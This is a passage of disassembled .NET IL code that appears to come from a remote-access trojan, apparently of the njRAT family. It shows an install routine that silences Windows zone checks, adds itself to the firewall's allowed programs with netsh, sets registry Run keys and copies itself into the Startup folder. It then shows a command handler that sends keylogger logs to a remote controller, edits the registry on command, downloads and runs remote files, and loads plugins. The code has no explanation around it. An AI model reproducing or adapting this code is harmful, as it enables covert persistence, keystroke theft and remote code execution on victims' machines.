    }  // end handler
    .try
    {
      IL_011f:  ldstr      "SEE_MASK_NOZONECHECKS"
      IL_0124:  ldstr      "1"
      IL_0129:  ldc.i4.1
      IL_012a:  call       void [mscorlib]System.Environment::SetEnvironmentVariable(string,
                                                                                     string,
                                                                                     valuetype [mscorlib]System.EnvironmentVariableTarget)
      IL_012f:  leave.s    IL_013f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0131:  dup
      IL_0132:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0137:  stloc.3
      IL_0138:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_013d:  leave.s    IL_013f

    }  // end handler
    .try
    {
      IL_013f:  ldc.i4.5
      IL_0140:  newarr     [mscorlib]System.String
      IL_0145:  stloc.s    V_8
      IL_0147:  ldloc.s    V_8
      IL_0149:  ldc.i4.0
      IL_014a:  ldstr      "netsh firewall add allowedprogram \""
      IL_014f:  stelem.ref
      IL_0150:  ldloc.s    V_8
      IL_0152:  ldc.i4.1
      IL_0153:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0158:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_015d:  stelem.ref
      IL_015e:  ldloc.s    V_8
      IL_0160:  ldc.i4.2
      IL_0161:  ldstr      "\" \""
      IL_0166:  stelem.ref
      IL_0167:  ldloc.s    V_8
      IL_0169:  ldc.i4.3
      IL_016a:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_016f:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
      IL_0174:  stelem.ref
      IL_0175:  ldloc.s    V_8
      IL_0177:  ldc.i4.4
      IL_0178:  ldstr      "\" ENABLE"
      IL_017d:  stelem.ref
      IL_017e:  ldloc.s    V_8
      IL_0180:  call       string [mscorlib]System.String::Concat(string[])
      IL_0185:  ldc.i4.0
      IL_0186:  ldc.i4.1
      IL_0187:  ldc.i4     0x1388
      IL_018c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0191:  pop
      IL_0192:  leave.s    IL_01a3

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0194:  dup
      IL_0195:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_019a:  stloc.s    V_4
      IL_019c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01a1:  leave.s    IL_01a3

    }  // end handler
    IL_01a3:  ldsfld     bool j.OK::Isu
    IL_01a8:  brfalse    IL_0249

    .try
    {
      IL_01ad:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_01b2:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_01b7:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_01bc:  ldsfld     string j.OK::sf
      IL_01c1:  ldc.i4.1
      IL_01c2:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_01c7:  ldsfld     string j.OK::RG
      IL_01cc:  ldstr      "\""
      IL_01d1:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_01d6:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_01db:  ldstr      "\" .."
      IL_01e0:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01e5:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_01ea:  leave.s    IL_01fb

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01ec:  dup
      IL_01ed:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01f2:  stloc.s    V_5
      IL_01f4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01f9:  leave.s    IL_01fb

    }  // end handler
    .try
    {
      IL_01fb:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0200:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0205:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_020a:  ldsfld     string j.OK::sf
      IL_020f:  ldc.i4.1
      IL_0210:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0215:  ldsfld     string j.OK::RG
      IL_021a:  ldstr      "\""
      IL_021f:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0224:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0229:  ldstr      "\" .."
      IL_022e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0233:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_0238:  leave.s    IL_0249

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_023a:  dup
      IL_023b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0240:  stloc.s    V_6
      IL_0242:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0247:  leave.s    IL_0249

    }  // end handler
    IL_0249:  ldsfld     bool j.OK::IsF
    IL_024e:  brfalse.s  IL_02b0

    .try
    {
      IL_0250:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0255:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_025a:  ldc.i4.7
      IL_025b:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0260:  ldstr      "\\"
      IL_0265:  ldsfld     string j.OK::RG
      IL_026a:  ldstr      ".exe"
      IL_026f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0274:  ldc.i4.1
      IL_0275:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string,
                                                               bool)
      IL_027a:  ldc.i4.7
      IL_027b:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0280:  ldstr      "\\"
      IL_0285:  ldsfld     string j.OK::RG
      IL_028a:  ldstr      ".exe"
      IL_028f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0294:  ldc.i4.3
      IL_0295:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode)
      IL_029a:  stsfld     class [mscorlib]System.IO.FileStream j.OK::FS
      IL_029f:  leave.s    IL_02b0

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02a1:  dup
      IL_02a2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02a7:  stloc.s    V_7
      IL_02a9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02ae:  leave.s    IL_02b0

    }  // end handler
    IL_02b0:  ret
  } // end of method OK::INS

  .method public static void  Ind(uint8[] b) cil managed
  {
    // Code size       3156 (0xc54)
    .maxstack  9
    .locals init (string[] V_0,
             uint8[] V_1,
             string V_2,
             int32 V_3,
             class [mscorlib]System.IO.MemoryStream V_4,
             class [mscorlib]System.Exception V_5,
             class [System]System.Net.WebClient V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             uint8[] V_9,
             object V_10,
             int32 V_11,
             class [mscorlib]System.IO.MemoryStream V_12,
             uint8[] V_13,
             object V_14,
             int32 V_15,
             class [mscorlib]System.IO.MemoryStream V_16,
             class [System.Drawing]System.Drawing.Graphics V_17,
             string V_18,
             class [mscorlib]System.IO.MemoryStream V_19,
             class [mscorlib]System.IO.MemoryStream V_20,
             class [System.Drawing]System.Drawing.Bitmap V_21,
             class [System.Drawing]System.Drawing.Bitmap V_22,
             class [mscorlib]System.Exception V_23,
             uint8[] V_24,
             string V_25,
             int32 V_26,
             class [mscorlib]System.IO.MemoryStream V_27,
             class [mscorlib]System.Exception V_28,
             class [System]System.Net.WebClient V_29,
             class [mscorlib]System.Exception V_30,
             class [mscorlib]System.Exception V_31,
             int32 V_32,
             int32 V_33,
             class [mscorlib]System.IO.MemoryStream V_34,
             class [mscorlib]System.Exception V_35,
             class [mscorlib]System.Exception V_36,
             string V_37,
             string V_38,
             string[] V_39,
             object[] V_40,
             string V_41,
             valuetype [System.Drawing]System.Drawing.Rectangle V_42,
             valuetype [System.Drawing]System.Drawing.Rectangle V_43,
             valuetype [System.Drawing]System.Drawing.Rectangle V_44,
             valuetype [System.Drawing]System.Drawing.Rectangle V_45,
             valuetype [System.Drawing]System.Drawing.Rectangle V_46,
             valuetype [System.Drawing]System.Drawing.Rectangle V_47,
             valuetype [System.Drawing]System.Drawing.Rectangle V_48,
             valuetype [System.Drawing]System.Drawing.Size V_49,
             string V_50,
             object[] V_51,
             bool[] V_52)
    IL_0000:  ldarga.s   b
    IL_0002:  call       string j.OK::BS(uint8[]&)
    IL_0007:  ldsfld     string j.OK::Y
    IL_000c:  ldc.i4.m1
    IL_000d:  ldc.i4.0
    IL_000e:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0013:  stloc.0
    .try
    {
      IL_0014:  ldloc.0
      IL_0015:  ldc.i4.0
      IL_0016:  ldelem.ref
      IL_0017:  stloc.s    V_37
      IL_0019:  ldloc.s    V_37
      IL_001b:  ldstr      "ll"
      IL_0020:  ldc.i4.0
      IL_0021:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0026:  ldc.i4.0
      IL_0027:  bne.un.s   IL_0034

      IL_0029:  ldc.i4.0
      IL_002a:  stsfld     bool j.OK::Cn
      IL_002f:  leave      IL_0c53

      IL_0034:  ldloc.s    V_37
      IL_0036:  ldstr      "kl"
      IL_003b:  ldc.i4.0
      IL_003c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0041:  ldc.i4.0
      IL_0042:  bne.un.s   IL_006d

      IL_0044:  ldstr      "kl"
      IL_0049:  ldsfld     string j.OK::Y
      IL_004e:  ldsfld     class j.kl j.OK::kq
      IL_0053:  ldflda     string j.kl::Logs
      IL_0058:  call       string j.OK::ENB(string&)
      IL_005d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0062:  call       bool j.OK::Send(string)
      IL_0067:  pop
      IL_0068:  leave      IL_0c53

      IL_006d:  ldloc.s    V_37
      IL_006f:  ldstr      "prof"
      IL_0074:  ldc.i4.0
      IL_0075:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_007a:  ldc.i4.0
      IL_007b:  bne.un     IL_0127

      IL_0080:  ldloc.0
      IL_0081:  ldc.i4.1
      IL_0082:  ldelem.ref
      IL_0083:  stloc.s    V_38
      IL_0085:  ldloc.s    V_38
      IL_0087:  ldstr      "~"
      IL_008c:  ldc.i4.0
      IL_008d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0092:  ldc.i4.0
      IL_0093:  bne.un.s   IL_00a7

      IL_0095:  ldloc.0
      IL_0096:  ldc.i4.2
      IL_0097:  ldelem.ref
      IL_0098:  ldloc.0
      IL_0099:  ldc.i4.3
      IL_009a:  ldelem.ref
      IL_009b:  ldc.i4.1
      IL_009c:  call       bool j.OK::STV(string,
                                                      object,
                                                      valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_00a1:  pop
      IL_00a2:  leave      IL_0c53

      IL_00a7:  ldloc.s    V_38
      IL_00a9:  ldstr      "!"
      IL_00ae:  ldc.i4.0
      IL_00af:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_00b4:  ldc.i4.0
      IL_00b5:  bne.un.s   IL_0107

      IL_00b7:  ldloc.0
      IL_00b8:  ldc.i4.2
      IL_00b9:  ldelem.ref
      IL_00ba:  ldloc.0
      IL_00bb:  ldc.i4.3
      IL_00bc:  ldelem.ref
      IL_00bd:  ldc.i4.1
      IL_00be:  call       bool j.OK::STV(string,
                                                      object,
                                                      valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_00c3:  pop
      IL_00c4:  ldstr      "getvalue"
      IL_00c9:  ldsfld     string j.OK::Y
      IL_00ce:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00d3:  ldloc.0
      IL_00d4:  ldc.i4.1
      IL_00d5:  ldelem.ref
      IL_00d6:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00db:  ldsfld     string j.OK::Y
      IL_00e0:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00e5:  ldloc.0
      IL_00e6:  ldc.i4.1
      IL_00e7:  ldelem.ref
      IL_00e8:  ldstr      ""
      IL_00ed:  call       object j.OK::GTV(string,
                                                        object)
      IL_00f2:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_00f7:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_00fc:  call       bool j.OK::Send(string)
      IL_0101:  pop
      IL_0102:  leave      IL_0c53

      IL_0107:  ldloc.s    V_38
      IL_0109:  ldstr      "@"
      IL_010e:  ldc.i4.0
      IL_010f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0114:  ldc.i4.0
      IL_0115:  bne.un     IL_0bbb

      IL_011a:  ldloc.0
      IL_011b:  ldc.i4.2
      IL_011c:  ldelem.ref
      IL_011d:  call       void j.OK::DLV(string)
      IL_0122:  leave      IL_0c53

      IL_0127:  ldloc.s    V_37
      IL_0129:  ldstr      "rn"
      IL_012e:  ldc.i4.0
      IL_012f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0134:  ldc.i4.0
      IL_0135:  bne.un     IL_0294

      IL_013a:  ldloc.0
      IL_013b:  ldc.i4.2
      IL_013c:  ldelem.ref
      IL_013d:  ldc.i4.0
      IL_013e:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_0143:  ldc.i4.s   31
      IL_0145:  bne.un.s   IL_01c0

      .try
      {
        IL_0147:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_014c:  stloc.s    V_4
        IL_014e:  ldloc.0
        IL_014f:  ldc.i4.0
        IL_0150:  ldelem.ref
        IL_0151:  ldsfld     string j.OK::Y
        IL_0156:  ldloc.0
        IL_0157:  ldc.i4.1
        IL_0158:  ldelem.ref
        IL_0159:  ldsfld     string j.OK::Y
        IL_015e:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0163:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_0168:  stloc.3
        IL_0169:  ldloc.s    V_4
        IL_016b:  ldarg.0
        IL_016c:  ldloc.3
        IL_016d:  ldarg.0
        IL_016e:  ldlen
        IL_016f:  conv.ovf.i4
        IL_0170:  ldloc.3
        IL_0171:  sub.ovf
        IL_0172:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0177:  ldloc.s    V_4
        IL_0179:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_017e:  call       uint8[] j.OK::ZIP(uint8[])
        IL_0183:  stloc.1
        IL_0184:  leave      IL_020b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0189:  dup
        IL_018a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_018f:  stloc.s    V_5
        IL_0191:  ldstr      "MSG"
        IL_0196:  ldsfld     string j.OK::Y
        IL_019b:  ldstr      "Execute ERROR"
        IL_01a0:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_01a5:  call       bool j.OK::Send(string)
        IL_01aa:  pop
        IL_01ab:  ldstr      "bla"
        IL_01b0:  call       bool j.OK::Send(string)
        IL_01b5:  pop
        IL_01b6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_01bb:  leave      IL_0c53

      }  // end handler
      IL_01c0:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_01c5:  stloc.s    V_6
      .try
      {
        IL_01c7:  ldloc.s    V_6
        IL_01c9:  ldloc.0
        IL_01ca:  ldc.i4.2
        IL_01cb:  ldelem.ref
        IL_01cc:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_01d1:  stloc.1
        IL_01d2:  leave.s    IL_020b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_01d4:  dup
        IL_01d5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_01da:  stloc.s    V_7
        IL_01dc:  ldstr      "MSG"
        IL_01e1:  ldsfld     string j.OK::Y
        IL_01e6:  ldstr      "Download ERROR"
        IL_01eb:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_01f0:  call       bool j.OK::Send(string)
        IL_01f5:  pop
        IL_01f6:  ldstr      "bla"
        IL_01fb:  call       bool j.OK::Send(string)
        IL_0200:  pop
        IL_0201:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0206:  leave      IL_0c53

      }  // end handler
      IL_020b:  ldstr      "bla"
      IL_0210:  call       bool j.OK::Send(string)
      IL_0215:  pop
      IL_0216:  call       string [mscorlib]System.IO.Path::GetTempFileName()
      IL_021b:  ldstr      "."
      IL_0220:  ldloc.0
      IL_0221:  ldc.i4.1
      IL_0222:  ldelem.ref
      IL_0223:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0228:  stloc.2
      .try
      {
        IL_0229:  ldloc.2
        IL_022a:  ldloc.1
        IL_022b:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_0230:  ldloc.2
        IL_0231:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
        IL_0236:  pop
        IL_0237:  ldstr      "MSG"
        IL_023c:  ldsfld     string j.OK::Y
        IL_0241:  ldstr      "Executed As "
        IL_0246:  ldloc.2
        IL_0247:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_024c:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_0251:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0256:  call       bool j.OK::Send(string)
        IL_025b:  pop
        IL_025c:  leave      IL_0c53

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0261:  dup
        IL_0262:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0267:  stloc.s    V_8
        IL_0269:  ldstr      "MSG"
        IL_026e:  ldsfld     string j.OK::Y
        IL_0273:  ldstr      "Execute ERROR "
        IL_0278:  ldloc.s    V_8
        IL_027a:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_027f:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0284:  call       bool j.OK::Send(string)
        IL_0289:  pop
        IL_028a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_028f:  leave      IL_0c53

      }  // end handler
      IL_0294:  ldloc.s    V_37
      IL_0296:  ldstr      "inv"
      IL_029b:  ldc.i4.0
      IL_029c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_02a1:  ldc.i4.0
      IL_02a2:  bne.un     IL_04d6

      IL_02a7:  ldloc.0
      IL_02a8:  ldc.i4.1
      IL_02a9:  ldelem.ref
      IL_02aa:  ldc.i4.0
      IL_02ab:  newarr     [mscorlib]System.Byte
      IL_02b0:  call       object j.OK::GTV(string,
                                                        object)
      IL_02b5:  castclass  uint8[]
      IL_02ba:  stloc.s    V_9
      IL_02bc:  ldloc.0
      IL_02bd:  ldc.i4.3
      IL_02be:  ldelem.ref
      IL_02bf:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_02c4:  ldc.i4.s   10
      IL_02c6:  clt
      IL_02c8:  ldloc.s    V_9
      IL_02ca:  ldlen
      IL_02cb:  conv.ovf.i4
      IL_02cc:  ldc.i4.0
      IL_02cd:  ceq
      IL_02cf:  and
      IL_02d0:  brfalse.s  IL_0318

      IL_02d2:  ldc.i4.5
      IL_02d3:  newarr     [mscorlib]System.String
      IL_02d8:  stloc.s    V_39
      IL_02da:  ldloc.s    V_39
      IL_02dc:  ldc.i4.0
      IL_02dd:  ldstr      "pl"
      IL_02e2:  stelem.ref
      IL_02e3:  ldloc.s    V_39
      IL_02e5:  ldc.i4.1
      IL_02e6:  ldsfld     string j.OK::Y
      IL_02eb:  stelem.ref
      IL_02ec:  ldloc.s    V_39
      IL_02ee:  ldc.i4.2
      IL_02ef:  ldloc.0
      IL_02f0:  ldc.i4.1
      IL_02f1:  ldelem.ref
      IL_02f2:  stelem.ref
      IL_02f3:  ldloc.s    V_39
      IL_02f5:  ldc.i4.3
      IL_02f6:  ldsfld     string j.OK::Y
      IL_02fb:  stelem.ref
      IL_02fc:  ldloc.s    V_39
      IL_02fe:  ldc.i4.4
      IL_02ff:  ldc.i4.1
      IL_0300:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_0305:  stelem.ref
      IL_0306:  ldloc.s    V_39
      IL_0308:  call       string [mscorlib]System.String::Concat(string[])
      IL_030d:  call       bool j.OK::Send(string)
      IL_0312:  pop
      IL_0313:  leave      IL_0c53

      IL_0318:  ldloc.0
      IL_0319:  ldc.i4.3
      IL_031a:  ldelem.ref
      IL_031b:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0320:  ldc.i4.s   10
      IL_0322:  ble.s      IL_039b

      IL_0324:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0329:  stloc.s    V_12
      IL_032b:  ldc.i4.6
      IL_032c:  newarr     [mscorlib]System.String
      IL_0331:  stloc.s    V_39
      IL_0333:  ldloc.s    V_39
      IL_0335:  ldc.i4.0
      IL_0336:  ldloc.0
      IL_0337:  ldc.i4.0
      IL_0338:  ldelem.ref
      IL_0339:  stelem.ref
      IL_033a:  ldloc.s    V_39
      IL_033c:  ldc.i4.1
      IL_033d:  ldsfld     string j.OK::Y
      IL_0342:  stelem.ref
      IL_0343:  ldloc.s    V_39
      IL_0345:  ldc.i4.2
      IL_0346:  ldloc.0
      IL_0347:  ldc.i4.1
      IL_0348:  ldelem.ref
      IL_0349:  stelem.ref
      IL_034a:  ldloc.s    V_39
      IL_034c:  ldc.i4.3
      IL_034d:  ldsfld     string j.OK::Y
      IL_0352:  stelem.ref
      IL_0353:  ldloc.s    V_39
      IL_0355:  ldc.i4.4
      IL_0356:  ldloc.0
      IL_0357:  ldc.i4.2
      IL_0358:  ldelem.ref
      IL_0359:  stelem.ref
      IL_035a:  ldloc.s    V_39
      IL_035c:  ldc.i4.5
      IL_035d:  ldsfld     string j.OK::Y
      IL_0362:  stelem.ref
      IL_0363:  ldloc.s    V_39
      IL_0365:  call       string [mscorlib]System.String::Concat(string[])
      IL_036a:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_036f:  stloc.s    V_11
      IL_0371:  ldloc.s    V_12
      IL_0373:  ldarg.0
      IL_0374:  ldloc.s    V_11
      IL_0376:  ldarg.0
      IL_0377:  ldlen
      IL_0378:  conv.ovf.i4
      IL_0379:  ldloc.s    V_11
      IL_037b:  sub.ovf
      IL_037c:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0381:  ldloc.s    V_12
      IL_0383:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0388:  call       uint8[] j.OK::ZIP(uint8[])
      IL_038d:  stloc.s    V_9
      IL_038f:  ldloc.0
      IL_0390:  ldc.i4.1
      IL_0391:  ldelem.ref
      IL_0392:  ldloc.s    V_9
      IL_0394:  ldc.i4.3
      IL_0395:  call       bool j.OK::STV(string,
                                                      object,
                                                      valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_039a:  pop
      IL_039b:  ldc.i4.5
      IL_039c:  newarr     [mscorlib]System.String
      IL_03a1:  stloc.s    V_39
      IL_03a3:  ldloc.s    V_39
      IL_03a5:  ldc.i4.0
      IL_03a6:  ldstr      "pl"
      IL_03ab:  stelem.ref
      IL_03ac:  ldloc.s    V_39
      IL_03ae:  ldc.i4.1
      IL_03af:  ldsfld     string j.OK::Y
      IL_03b4:  stelem.ref
      IL_03b5:  ldloc.s    V_39
      IL_03b7:  ldc.i4.2
      IL_03b8:  ldloc.0
      IL_03b9:  ldc.i4.1
      IL_03ba:  ldelem.ref
      IL_03bb:  stelem.ref
      IL_03bc:  ldloc.s    V_39
      IL_03be:  ldc.i4.3
      IL_03bf:  ldsfld     string j.OK::Y
      IL_03c4:  stelem.ref
      IL_03c5:  ldloc.s    V_39
      IL_03c7:  ldc.i4.4
      IL_03c8:  ldc.i4.0
      IL_03c9:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_03ce:  stelem.ref
      IL_03cf:  ldloc.s    V_39
      IL_03d1:  call       string [mscorlib]System.String::Concat(string[])
      IL_03d6:  call       bool j.OK::Send(string)
      IL_03db:  pop
      IL_03dc:  ldloc.s    V_9
      IL_03de:  ldstr      "A"
      IL_03e3:  call       object j.OK::Plugin(uint8[],
                                                           string)
      IL_03e8:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_03ed:  stloc.s    V_10
      IL_03ef:  ldloc.s    V_10
      IL_03f1:  ldnull
      IL_03f2:  ldstr      "h"
      IL_03f7:  ldc.i4.1
      IL_03f8:  newarr     [mscorlib]System.Object
      IL_03fd:  stloc.s    V_40
      IL_03ff:  ldloc.s    V_40
      IL_0401:  ldc.i4.0
      IL_0402:  ldsfld     string j.OK::H
      IL_0407:  stelem.ref
      IL_0408:  ldloc.s    V_40
      IL_040a:  ldnull
      IL_040b:  ldnull
      IL_040c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0411:  ldloc.s    V_10
      IL_0413:  ldnull
      IL_0414:  ldstr      "p"
      IL_0419:  ldc.i4.1
      IL_041a:  newarr     [mscorlib]System.Object
      IL_041f:  stloc.s    V_40
      IL_0421:  ldloc.s    V_40
      IL_0423:  ldc.i4.0
      IL_0424:  ldsfld     string j.OK::P
      IL_0429:  stelem.ref
      IL_042a:  ldloc.s    V_40
      IL_042c:  ldnull
      IL_042d:  ldnull
      IL_042e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0433:  ldloc.s    V_10
      IL_0435:  ldnull
      IL_0436:  ldstr      "osk"
      IL_043b:  ldc.i4.1
      IL_043c:  newarr     [mscorlib]System.Object
